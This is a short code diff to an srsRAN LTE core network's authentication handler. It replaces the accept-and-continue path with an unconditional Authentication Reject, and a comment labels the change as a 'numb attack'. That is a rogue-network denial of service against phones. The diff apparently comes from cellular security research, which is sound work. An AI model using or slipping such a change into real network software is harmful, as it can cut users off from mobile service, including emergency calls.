@@ -1052,13 +1052,23 @@ bool nas::handle_authentication_response(srsran::byte_buffer_t* nas_rx)
     m_logger.info("Downlink NAS: Sending Authentication Reject.");
   } else {
     // Authentication accepted
-    srsran::console("UE Authentication Accepted.\n");
-    m_logger.info("UE Authentication Accepted.");
+//    srsran::console("UE Authentication Accepted.\n");
+//    m_logger.info("UE Authentication Accepted.");
 
     // Send Security Mode Command
-    m_sec_ctx.ul_nas_count = 0; // Reset the NAS uplink counter for the right key k_enb derivation
-    pack_security_mode_command(nas_tx.get());
-    srsran::console("Downlink NAS: Sending NAS Security Mode Command.\n");
+//    m_sec_ctx.ul_nas_count = 0; // Reset the NAS uplink counter for the right key k_enb derivation
+//    pack_security_mode_command(nas_tx.get());
+//    srsran::console("Downlink NAS: Sending NAS Security Mode Command.\n");
+
+
+    // Authentication rejected to conduct numb attack
+    srsran::console("UE Authentication Rejected.\n");
+    m_logger.warning("UE Authentication Rejected.");
+
+    // Send back Athentication Reject
+    pack_authentication_reject(nas_tx.get());
+    m_logger.info("Downlink NAS: Sending Authentication Reject.");
+
   }
 
   // Send reply
